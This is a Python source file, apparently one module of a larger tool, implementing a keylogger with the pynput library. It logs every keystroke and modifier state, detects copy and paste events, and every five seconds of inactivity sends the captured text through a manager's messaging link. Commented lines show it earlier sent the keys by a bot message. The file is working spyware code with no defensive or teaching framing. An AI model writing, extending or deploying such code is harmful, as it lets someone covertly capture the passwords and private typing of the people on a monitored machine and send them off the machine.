from threading import Timer
from time import sleep
from pynput import keyboard
from pynput.keyboard import Listener, Key

# from main_moduli import Manager

COMBINATION = {keyboard.Key.cmd, keyboard.Key.ctrl}
current = set()

class KeyRegister:
  def __init__(self):
    # self.key_strokes = []
    self.session_keys = ''
    self.timer = None
    self.managerLink = None
    self.l = None
    self.lastKey = None
  
  def start (self):
    self.l = Listener(on_press=self.keyListenerPress, on_release=self.keyListenerRelease)
    self.l.start()

    # keyboard.on_press(self.keyListenerPress)
    # keyboard.on_release(self.keyListenerRelease) # Bug della libreria, entrambi insieme non funzionano!
    # keyboard.add_hotkey('ctrl+c', self.copyPasteEvent, args=('copy'))
    # keyboard.add_hotkey('ctrl+v', self.copyPasteEvent, args=('paste'))
  
  def kill (self):
    # keyboard.unhook_all()
    self.l.stop()

  def keyListenerPress (self, event):
    current.add(event)
    if event == Key.enter:
      self.session_keys += '[enter]'
    elif event == Key.backspace:
      self.session_keys += '[backspace]'
    elif event == Key.ctrl_l or event == Key.ctrl_r:
      if event != self.lastKey:
        self.session_keys += '[ctrl ON]'
    elif event == Key.shift_l or event == Key.shift_r:
      if event != self.lastKey:
        self.session_keys += '[shift ON]'
    elif event == Key.alt_l or event == Key.alt_r:
      if event != self.lastKey:
        self.session_keys += '[alt ON]'

    else:
      ev_str = str(event).replace("'", "")
      if len(ev_str) > 3 and ev_str[0:4] == 'Key.':
        self.session_keys += f'[{ev_str[4:]}]'
      else:
        self.session_keys += ev_str
      if ev_str == '\\x03':
        self.copyEvent()
      elif ev_str == '\\x16':
        self.pasteEvent()
    self.lastKey = event
    self.resetTimer()

  def keyListenerRelease (self, event):
    if event == Key.ctrl_l or event == Key.ctrl_r:
      self.session_keys += '[ctrl OFF]'
    elif event == Key.shift_l or event == Key.shift_r:
      self.session_keys += '[shift OFF]'
    elif event == Key.alt_l or event == Key.alt_r:
      self.session_keys += '[alt OFF]'
    try:
      current.remove(event)
    except KeyError:
        pass
    self.resetTimer()
  
  def resetTimer (self):
    if self.timer:
      self.timer.cancel()
    self.timer = Timer(5.0, self.sendData)
    self.timer.start()
  
  def sendData (self):
    #if session_keys:
    #  bot.sendMessage(None, session_keys)
    # print('DATI DA INVIARE', self.session_keys)
    if self.managerLink:
      self.managerLink.sendTextMessage(self.session_keys)
    self.session_keys = ''
  
  def copyEvent (self):
    if self.managerLink:
      self.managerLink.onCopyEvent()
  
  def pasteEvent (self):
    if self.managerLink:
      self.managerLink.onPasteEvent()

if __name__ == '__main__':
  kr = KeyRegister()
  kr.start()
  # print('started')
  sleep(30)
  kr.kill()
  # print('stopped')